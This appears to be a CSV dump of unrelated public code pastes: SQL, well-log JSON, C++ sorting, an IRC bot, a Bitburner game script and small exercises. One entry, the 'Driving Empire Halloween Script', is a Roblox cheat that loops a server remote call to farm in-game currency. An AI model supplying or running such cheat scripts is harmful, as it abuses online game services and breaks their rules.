id,title,username,language,date,content
TW0br8nu,Schronisko,czemu,SQL,Sunday 22nd of October 2023 01:03:17 PM CDT,"CREATE TABLE zwierze (
    zwierze_id INT PRIMARY KEY,
    typ VARCHAR(10) CHECK (typ IN ('pies', 'kot', 'papuga', 'chomik')),
    wiek TINYINT CHECK (wiek >= 0 AND wiek <= 255),
    imie VARCHAR(10),
    info TEXT,
    cena DECIMAL(5, 2) CHECK (cena >= 0 AND cena <= 999.99)
);

CREATE TABLE wlasciciel (
    wlasciciel_id INT PRIMARY KEY,
    imie VARCHAR(25),
    nazwisko VARCHAR(25)
);

CREATE TABLE schronisko (
    schronisko_id INT PRIMARY KEY,
    nazwa VARCHAR(255)
);
"
wgRPyzrS,wl_mnems_units,boolit,JSON,Sunday 22nd of October 2023 12:50:38 PM CDT,"{'DEPT':  {'description_ru': 'Фактическая глубина вдоль пробуренной скважины',
                                  'log_ru': 'Глубина',
                                  'unit_and_conversion_en': [{'id': 1, 'scale': 'm', 'value': 1}],
                                  'unit_and_conversion_ru': [{'id': 1, 'scale': 'м', 'value': 1}],
                                  'possible_mnemonics': ['dept', 'depth', 'md'],
                                  'constant_mnemonic': False},                       
                        'RT_I_0': {'description_ru': 'Экстра ближний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_0',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['at10', 'ikrt1', 'r20t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#D84904'}, 
                        'RT_I_1': {'description_ru':'Ближний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_1',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['arh16pc', 'at20', 'ikrt2', 'r30t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#FA6D70'},
                        'RT_I_2': {'description_ru': 'Средний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_2',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['arh32pc', 'at30', 'ikrt3', 'r40t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#934A0D'},
                        'RT_I_3': {'description_ru': 'Дальний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_3',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['arh48pc', 'at60', 'ikrt4', 'r60t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#1D7056'},
                        'RT_I_4': {'description_ru': 'Экстра дальний зонд индукционного каротажа',
                                   'log_ru': 'УЭС_ИК_4',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['at90', 'ikrt5', 'r85t'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#441855'},
                        'RT_LL':  {'description_ru': 'Боковой каротаж',
                                   'log_ru': 'УЭС_БК',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['bk', 'bк'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#40B28F'},
                        'RT_LL_0':{'description_ru': 'Экстра ближний зонд бокового каротажа',
                                   'log_ru': 'УЭС_БК_0',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                   'possible_mnemonics': ['rla1'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#8958D1'},
                        'RT_LL_1':{'description_ru': 'Ближний зонд бокового каротажа',
                                   'log_ru': 'УЭС_БК_1',
                                   'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                   'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                   'possible_mnemonics': ['rla2'],
                                   'constant_mnemonic': False,
                                   'curve_color': '#82C424'}, 
                        'RT_LL_2': {'description_ru': 'Средний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_2',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                    'possible_mnemonics': ['rla3'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#B5F78C'},
                        'RT_LL_3': {'description_ru': 'Дальний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_3',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}], 
                                    'possible_mnemonics': ['rla4'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#EC6AA3'},
                        'RT_LL_4': {'description_ru': 'Экстра дальний зонд бокового каротажа',
                                    'log_ru': 'УЭС_БК_4',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'ohmm', 'value': 1}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'омм', 'value': 1}],
                                    'possible_mnemonics': ['rla5'],
                                    'constant_mnemonic': False,
                                    'curve_color': '#3E3439'},  
                        'DS':      {'description_ru': 'Диаметр скважины',
                                    'log_ru': 'Каверномер',
                                    'unit_and_conversion_en': [{'id': 1, 'scale': 'm', 'value': 1},
                                                               {'id': 2, 'scale': 'cm', 'value': 0.01},
                                                               {'id': 3, 'scale': 'mm', 'value': 0.001}],
                                    'unit_and_conversion_ru': [{'id': 1, 'scale': 'м', 'value': 1},
                                                               {'id': 2, 'scale': 'см', 'value': 0.01},
                                                               {'id': 3, 'scale': 'мм', 'value': 0.001}],
                                    'possible_mnemonics': ['ds', 'cal', 'calix', 'alhsi', 'calie', 'kavern'],
                                    'constant_mnemonic': True,
                                    'curve_color': '#534FEA'},
                        'DT':       {'description_ru': 'Акустический каротаж (время пробега продольной звуковой волны)',
                                     'log_ru': 'Акустика',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'us/m', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'мкс/м', 'value': 1}],
                                     'possible_mnemonics': ['dt'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#11755D'},
                        'GR':       {'description_ru': 'Метод измерения естественного гамма-излучения породы',
                                     'log_ru': 'Гамма каротаж',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ur/h', 'value': 1},
                                                                {'id': 2, 'scale': 'api', 'value': 0.1},
                                                                {'id': 3, 'scale': 'gapi', 'value': 0.1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'мкр/ч', 'value': 1},
                                                                {'id': 2, 'scale': 'апи', 'value': 0.1},
                                                                {'id': 3, 'scale': 'апи', 'value': 0.1}],
                                     'possible_mnemonics': ['gr', 'hagrt', 'dgrcc', 'hagr_run05', 'gk', 'dgrcc1'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#B016A8'},
                        'PEF':      {'description_ru': 'Метод измерения фотоэффекта',
                                     'log_ru': 'Фотоэл. фактор',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'e/b', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'э/б', 'value': 1}],
                                     'possible_mnemonics': ['pef', 'pe', 'alpelc'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#B8F143'},
                        'RHO':      {'description_ru': 'Метод измерения объемной плотности горных пород',
                                     'log_ru': 'Объемная плотность',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'g/cc', 'value': 1},
                                                                {'id': 2, 'scale': 'g/c3', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'г/см3', 'value': 1},
                                                                {'id': 2, 'scale': 'г/с3', 'value': 1}],
                                     'possible_mnemonics': ['rho', 'rhob', 'alcda', 'ggk', 'ggkp'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#20BFDF'}, 
                        'W':        {'description_ru': 'Водородосодержание',
                                     'log_ru': 'Водородосодержание',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'possible_mnemonics': ['w'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#8C218D'},
                        'POTA':     {'description_ru': 'Содержание калия',
                                     'log_ru': 'Содержание калия',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1}],
                                     'possible_mnemonics': ['pota'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#F69B28'},
                        'THOR':     {'description_ru': 'Содержание тория',
                                     'log_ru': 'Содержание тория',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'possible_mnemonics': ['thor'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#F42563'},
                        'URAN':     {'description_ru': 'Содержание урана',
                                     'log_ru': 'Содержание урана',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': 'ppm', 'value': 1}],
                                     'possible_mnemonics': ['uran'],
                                     'constant_mnemonic': False,
                                     'curve_color': '#8B53B8'}, 
                        'NPHI':     {'description_ru': 'Нейтронная пористость',
                                     'log_ru': 'Нейтронная пористость',
                                     'unit_and_conversion_en': [{'id': 1, 'scale': '%', 'value': 1},
                                                                {'id': 2, 'scale': 'c.u.', 'value': 0.01}],                                          
                                     'unit_and_conversion_ru': [{'id': 1, 'scale': '%', 'value': 1},
                                                                {'id': 2, 'scale': 'у.е.', 'value': 0.01}],      
                                     'possible_mnemonics': [""nphi"", ""npss"", ""tnps"", ""nnkp""],
                                     'constant_mnemonic': False,
                                     'curve_color': '#532D26'},
                        'LITH':     {'description_ru': 'Флаг литологии',
                                     'log_ru': 'Литология',  
                                     'litho_class_en': [{'id': 0, 'no data':[""no data"", ""without data"", ""unknown""], 'color': '#FFFFFF'}, 
                                                       {'id': 1, 'sandstone':[""sandstone""], 'color': '#ffc400'}, 
                                                       {'id': 2, 'argillite':[""argillite""], 'color': '#cc654b'}, 
                                                       {'id': 3, 'carbonated sandstone':[""carbonated sandstone""], 'color': '#ba863d'}, 
                                                       {'id': 4, 'siltstone':[""siltstone""], 'color': '#e3c396'}, 
                                                       {'id': 5, 'oil-saturated siltstone':[""oil-saturated siltstone""], 'color': '#b09672'}, 
                                                       {'id': 6, 'clay':[""clay""], 'color': '#d40000'}, 
                                                       {'id': 7, 'coal':[""coal""], 'color': '#544d4d'}, 
                                                       {'id': 8, 'oil-saturated sandstone':[""oil-saturated sandstone""], 'color': '#7d6102'}, 
                                                       {'id': 9, 'water-saturated sandstone':[""water-saturated sandstone""], 'color': '#fce69a'}, ], 
                                     'litho_class_ru': [{'id': 0, 'нет данных':[""нет данных"", ""неизвестно"", ""без данных"", ""отсутствуют"", ""отсутствует""], 'color': '#FFFFFF'}, 
                                                       {'id': 1, 'песчаник':[""песчаник""], 'color': '#ffc400'}, 
                                                       {'id': 2, 'аргиллит':[""аргиллит""], 'color': '#cc654b'}, 
                                                       {'id': 3, 'песчаник с карбонатным цементом':[""песчаник с карбонатным цементом"", ""плотняк""], 'color': '#ba863d'}, 
                                                       {'id': 4, 'алевролит':[""алевролит""], 'color': '#e3c396'}, 
                                                       {'id': 5, 'алевролит нефтенасыщенный':[""алевролит нефтенасыщенный""], 'color': '#b09672'}, 
                                                       {'id': 6, 'глина':[""глина""], 'color': '#d40000'}, 
                                                       {'id': 7, 'уголь':[""уголь""], 'color': '#544d4d'}, 
                                                       {'id': 8, 'песчаник нефтенасыщенный':[""песчаник нефтенасыщенный""], 'color': '#7d6102'}, 
                                                       {'id': 9, 'песчаник водонасыщенный':[""песчаник водонасыщенный""], 'color': '#fce69a'}, ],   
                                     'possible_mnemonics': ['lith', 'litho', 'lithology'], 
                                     'constant_mnemonic': True}
                       }"
XTvFZ0Yr,simple_hack.js,jonator_3,JavaScript,Sunday 22nd of October 2023 12:07:44 PM CDT,"export async function main(ns) {
    var target = ns.getHostname();
    var max_security_level = ns.getServerMinSecurityLevel(target);
    var min_money_out = ns.getServerMaxMoney(target) + 0.9;

    while(true) {
        while(ns.getServerSecurityLevel(target) > max_security_level){
            await ns.weaken(target);
        }
		await ns.hack(target);

        while (ns.hackAnalyze(target) * ns.getServerMoneyAvailable(target) < min_money_out){
        await ns.grow(target)
        }
	}
}"
56Cb10jk,Fishing Competition,bAngelov,Python,Sunday 22nd of October 2023 11:58:42 AM CDT,"area_size = int(input())
fishing_area = [list(int(i) if i.lstrip(""-"").isdigit() else i for i in list(input())) for _ in range(area_size)]
position = [(r,c) for r in range(area_size) for c in range(area_size) if fishing_area[r][c] == ""S""][0]
moves = {""up"":(-1,0), ""down"":(1,0), ""left"":(0,-1), ""right"":(0,1)}
quota = 20
collected_fish = 0
command = input()

while command != ""collect the nets"":
    row,col = position
    fishing_area[row][col] = ""-""
    next_row,next_col = moves[command]
    row = (row + next_row) % area_size if row + next_row >= 0 else area_size - 1
    col = (col + next_col) % area_size if col + next_col >= 0 else area_size - 1
    position = row,col
    if isinstance(fishing_area[row][col],int):
        collected_fish += fishing_area[row][col]
        fishing_area[row][col] = ""-""

    if fishing_area[row][col] == ""W"":
        print(f""You fell into a whirlpool! The ship sank and you lost the fish you caught. Last coordinates of the ship: [{row},{col}]"")
        collected_fish = 0
        exit(0)
    fishing_area[row][col] = ""S""
    command = input()


if collected_fish >= quota:
    print(""Success! You managed to reach the quota!"")

if collected_fish < quota:
    print(f""You didn't catch enough fish and didn't reach the quota! \
You need {quota - collected_fish} tons of fish more.""
)

if collected_fish:
    print(f""Amount of fish caught: {collected_fish} tons."")
[print(*row, sep="""") for row in fishing_area]"
HnbQXgLc,CreateCharacter,KerryURKRAFT,JSON,Sunday 22nd of October 2023 11:39:52 AM CDT,"module.exports = async function (context, req) {
    if (req.body && req.body.characterName && req.body.playFabId) {
        const characterName = req.body.characterName;
        const playFabId = req.body.playFabId;

        // Assicurati di includere il modulo `playfab-sdk` per poterlo utilizzare
        var playfab = require(""playfab-sdk/Scripts/PlayFab/PlayFab.js"");
        
        // Inizializza PlayFab con le tue informazioni di sviluppatore
        playfab.settings.developerSecretKey = ""<28251>"";

        // Crea un nuovo personaggio su PlayFab
        const request = {
            CharacterName: characterName,  // Imposta il nome del personaggio
            PlayFabId: playFabId,         // Imposta il PlayFab ID
            
            // Puoi includere altri parametri del personaggio se necessario
        };

        context.log(`Valore di characterName: ${characterName}`);
        
        playfab.server.GrantCharacterToUser(request, function(result, error) {
            if (error) {
                context.log.error(`Errore durante la creazione del personaggio: ${error.errorMessage} ${characterName}`);
                context.res = {
                    status: 500,
                    body: { error: 'Errore durante la creazione del personaggio su PlayFab.' }
                };
            } else {
                context.res = {
                    status: 200,
                    body: { success: `Personaggio ${characterName} ${characterName}creato con successo per PlayFabId ${playFabId}.` }
                };
            }
            context.log(`Valore di characterName: ${characterName}`);
        });
    } else {
        context.res = {
            status: 400,
            
            body: { error: 'Parametri characterName e playFabId mancanti. Assicurati di fornire un nome per il personaggio e il tuo PlayFabId.', },

            
        };
    }
};"
WHCx8iQe,multithread utf8 string sort,fatalryuu,C++ (WinAPI),Sunday 22nd of October 2023 11:15:49 AM CDT,"#include <iostream>
#include <ctime>
#include <cstdlib>
#include <vector>
#include <string>
#include <algorithm>
#include <chrono>
#include <windows.h>
#include <random>

std::wstring generateRandomText(int length) {
    std::mt19937 rng(std::random_device{}());

    std::uniform_int_distribution<int> unicode_distribution(0x0021, 0x007E);

    std::wstring result;
    result.reserve(length);

    for (int i = 0; i < length; ++i) {
        int unicode_code = unicode_distribution(rng);
        result.push_back(static_cast<wchar_t>(unicode_code));
    }

    return result;
}

void quickSortRange(std::vector<std::wstring>& arr, int low, int high, bool ascending) {
    if (low < high) {
        int pivotIndex = low + (high - low) / 2;
        std::wstring pivot = arr[pivotIndex];
        int i = low;
        int j = high;

        while (i <= j) {
            if (ascending == 1) {
                while (arr[i] < pivot) {
                    i++;
                }
                while (arr[j] > pivot) {
                    j--;
                }
            }
            else {
                while (arr[i] > pivot) {
                    i++;
                }
                while (arr[j] < pivot) {
                    j--;
                }
            }

            if (i <= j) {
                std::swap(arr[i], arr[j]);
                i++;
                j--;
            }
        }

        if (low < j) {
            quickSortRange(arr, low, j, ascending);
        }
        if (i < high) {
            quickSortRange(arr, i, high, ascending);
        }
    }
}

struct ThreadData {
    std::vector<std::wstring>& arr;
    int low;
    int high;
    bool ascending;
};

DWORD WINAPI QuickSortThread(LPVOID lpParam) {
    ThreadData* data = static_cast<ThreadData*>(lpParam);
    quickSortRange(data->arr, data->low, data->high, data->ascending);

    delete data;
    return 0;
}

void quickSortMultithread(std::vector<std::wstring>& arr, int numThreads, bool ascending) {
    if (numThreads <= 1 || arr.size() <= 1) {
        quickSortRange(arr, 0, arr.size() - 1, ascending);
        return;
    }

    int numElements = arr.size();
    int elementsPerThread = numElements / numThreads;

    std::vector<HANDLE> threadHandles;
    for (int i = 0; i < numThreads; i++) {
        ThreadData* data = new ThreadData{ arr, 0, (int)arr.size() - 1, ascending };
        HANDLE hThread = CreateThread(NULL, 0, QuickSortThread, data, 0, NULL);
        threadHandles.push_back(hThread);
    }

    WaitForMultipleObjects(numThreads, threadHandles.data(), TRUE, INFINITE);

    for (HANDLE hThread : threadHandles) {
        CloseHandle(hThread);
    }
}

int main() {
    setlocale(LC_CTYPE, """");
    srand(static_cast<unsigned int>(time(nullptr)));

    const int LENGTH_OF_STRINGS = 10;
    const int AMOUNT_OF_OUTPUT_STRINGS_PER_PART = 20;

    int amountOfStrings;
    int amountOfThreads;
    bool ascending;

    std::wcout << ""Enter the number of threads: "";
    std::wcin >> amountOfThreads;
    std::wcout << ""Enter the number of strings: "";
    std::wcin >> amountOfStrings;
    std::wcout << ""Sort in ascending (1) or descending (0) order: "";
    std::wcin >> ascending;

    std::locale::global(std::locale(""en_US.UTF-8""));
    std::vector<std::wstring> strings;
    auto start = std::chrono::high_resolution_clock::now();
    for (int i = 0; i < amountOfStrings; i++) {
        strings.push_back(generateRandomText(LENGTH_OF_STRINGS));
    }
    auto end = std::chrono::high_resolution_clock::now();
    auto duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);

    std::wcout << amountOfStrings << "" strings has been successfully generated in "" << duration.count() / 1000.0 << "" seconds"" << std::endl;

    start = std::chrono::high_resolution_clock::now();
    quickSortMultithread(strings, amountOfThreads, ascending);
    end = std::chrono::high_resolution_clock::now();
    duration = std::chrono::duration_cast<std::chrono::milliseconds>(end - start);
    
    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""First "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings : \n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = 0; i < AMOUNT_OF_OUTPUT_STRINGS_PER_PART; i++) {
        std::wcout << strings[i] << std::endl;
    }

    int upperPart = std::ceil(static_cast<double>(AMOUNT_OF_OUTPUT_STRINGS_PER_PART) / 2);
    int lowerPart = std::floor(static_cast<double>(AMOUNT_OF_OUTPUT_STRINGS_PER_PART) / 2);

    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""Middle "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings:\n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = amountOfStrings / 2 - lowerPart; i < amountOfStrings / 2 + upperPart; i++) {
        std::wcout << strings[i] << std::endl;
    }

    std::wcout << ""--------------------------------------------------------------\n"";
    std::wcout << ""Last "" << AMOUNT_OF_OUTPUT_STRINGS_PER_PART << "" sorted strings:\n"";
    std::wcout << ""--------------------------------------------------------------\n"";
    for (int i = amountOfStrings - AMOUNT_OF_OUTPUT_STRINGS_PER_PART; i < amountOfStrings; i++) {
        std::wcout << strings[i] << std::endl;
    }
    
    std::wcout << ""Time taken for sorting: "" << duration.count() / 1000.0 << "" seconds"" << std::endl;

    exit(0);
}
"
mVzRXEF1,Untitled,NicciStevens,Python,Sunday 22nd of October 2023 11:14:20 AM CDT,"#! /usr/bin/env python
#
# Example program using irc.bot.
#
# Joel Rosdahl <joel@rosdahl.net>

import irc.bot
import irc.strings
from irc.client import ip_numstr_to_quad, ip_quad_to_numstr
import random
import subprocess
import _thread
import time
import sys

def getFortune():
    x = subprocess.run('fortune',text=True,capture_output=True)
    return x.stdout.split('\n')

class TestBot(irc.bot.SingleServerIRCBot):
    def __init__(self, channel, nickname, server, port=6667):
        irc.bot.SingleServerIRCBot.__init__(self, [(server, port)], nickname, nickname)
        self.channel = channel
        self.c = None

    def on_nicknameinuse(self, c, e):
        c.nick(c.get_nickname() + ""_"")

    def on_welcome(self, c, e):
        c.join(self.channel)

    def on_privmsg(self, c, e):
        self.do_command(e, e.arguments[0])

    def on_pubmsg(self, c, e):
        a = e.arguments[0].split("":"", 1)
        if type(a) is list:
            word = a[0]
        else:
            word = a
        #print('on_pubmsg',c.__dict__,word)
        if(word.startswith('@fortune')):
            if True:
            #try:
                resp=getFortune()
                for i in resp:
                    c.privmsg(self.channel,i)
            else:
            #except Exception as e:
                print(f'Exception {e} on {c}.privmsg')
            return
        if len(a) > 1 and irc.strings.lower(a[0]) == irc.strings.lower(self.connection.get_nickname()):
                self.do_command(e, a[1].strip())
        return

    def on_dccmsg(self, c, e):
        c.privmsg(""You said: "" + e.arguments[0])

    def on_dccchat(self, c, e):
        if len(e.arguments) != 2:
            return
        args = e.arguments[1].split()
        if len(args) == 4:
            try:
                address = ip_numstr_to_quad(args[2])
                port = int(args[3])
            except ValueError:
                return
            self.dcc_connect(address, port)

    def do_command(self, e, cmd):
        nick = e.source.nick
        c = self.connection

        #if cmd == ""disconnect"":
        #    self.disconnect()
        #elif cmd == ""die"":
        #    self.die()
        if cmd == ""stats"":
            for chname, chobj in self.channels.items():
                c.notice(nick, ""--- Channel statistics ---"")
                c.notice(nick, ""Channel: "" + chname)
                users = list(chobj.users())
                users.sort()
                c.notice(nick, ""Users: "" + "", "".join(users))
                opers = list(chobj.opers())
                opers.sort()
                c.notice(nick, ""Opers: "" + "", "".join(opers))
                voiced = list(chobj.voiced())
                voiced.sort()
                c.notice(nick, ""Voiced: "" + "", "".join(voiced))
        elif cmd == ""dcc"":
            dcc = self.dcc_listen()
            c.ctcp(""DCC"", nick, ""CHAT chat %s %d"" % (
                ip_quad_to_numstr(dcc.localaddress),
                dcc.localport))
        else:
            c.notice(nick, ""Not understood: "" + cmd)

def main():
    import sys
    if len(sys.argv) != 4:
        print(""Usage: testbot <server[:port]> <channel> <nickname>"")
        sys.exit(1)

    s = sys.argv[1].split("":"", 1)
    server = s[0]
    if len(s) == 2:
        try:
            port = int(s[1])
        except ValueError:
            print(""Error: Erroneous port."")
            sys.exit(1)
    else:
        port = 6667
    channel = sys.argv[2]
    nickname = sys.argv[3]

    bot = TestBot(channel, nickname, server, port)
    bot.start()

if __name__ == ""__main__"":
    main()
"
XpkWSVE0,Driving Empire Halloween Script,FROSTYOO7,Lua,Sunday 22nd of October 2023 11:13:45 AM CDT,"while wait(15)do
local args = {
    [1] = 100
}

game:GetService(""ReplicatedStorage"").Remotes.Halloween2023_ConsumeBuffer:FireServer(unpack(args))
end
-- Script Was Made By Wexik#1515 alias FROSTY007
-- this script will give you 100 candies every 20-30 seconds"
3whbRPvg,Untitled,Rofyda_Elghadban1,C++,Sunday 22nd of October 2023 10:58:34 AM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 //#define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */
 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

 void solve(){
  int n,k;
  cin>>n>>k;
  string s;
  cin>>s;
  map<char,int>mp;
  vector<int>o,e,v;
  for(int i=0;i<s.size();i++){
    mp[s[i]]++;
  }
  for(auto& i:mp){
    if(i.second%2!=0){
      o.push_back(i.second);
    }else{
      e.push_back(i.second);
    }
  }
  sort(all(o));
  sort(all(e));
  for(int i=0;i<o.size();i++){
    v.push_back(o[i]);
  }
  for(int i=0;i<e.size();i++){
    v.push_back(e[i]);
  }
  int l=0,countero=0,countere=0;
  for(int i=0;i<v.size();i++){
    if(k>=v[i]){
      l++;
      k-=v[i];
    }
  }
  for(int i=l;i<v.size();i++){
    if(v[i]%2!=0){
      countero++;
    }
  }
  if(countero>1){
    cout<<""NO""<<""\n"";
  }else{
    cout<<""YES""<<""\n"";
  }
 }


 int main(){
  Rofyda_Elghadban();
  int t;
  cin>>t;
  while(t--){
    solve();
  }
  // solve();
  return 0;
 }
"
yWjuD340,JS Watermark,Ant8893,JavaScript,Sunday 22nd of October 2023 10:58:23 AM CDT,"const watermarkDiv = document.createElement('div');

watermarkDiv.style = `
  position: fixed;
  margin: 15px;
  bottom: 0;
  left: 0;
  width: 200px;
  height: 80px;
  border-radius: 15px;
  background-color: rgba(0, 0, 0, 0.5);
`;

const watermarkTextTitle = document.createElement('div');
watermarkTextTitle.style = `
  position: absolute;
  top: 10px;
  left: 0;
  width: 100%;
  text-align: center;
  font-size: 16px;
  font-weight: bold;
  color: white;
  font-family: Arial, sans-serif;
`;
watermarkTextTitle.textContent = 'Title';

const watermarkTextDescription = document.createElement('div');
watermarkTextDescription.style = `
  position: absolute;
  top: 30px;
  left: 0;
  width: 100%;
  text-align: center;
  font-size: 12px;
  font-weight: normal;
  color: white;
  font-family: Arial, sans-serif;
`;
watermarkTextDescription.textContent = 'Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed vestibulum commodo velit.';

watermarkDiv.appendChild(watermarkTextTitle);
watermarkDiv.appendChild(watermarkTextDescription);

document.body.appendChild(watermarkDiv);"
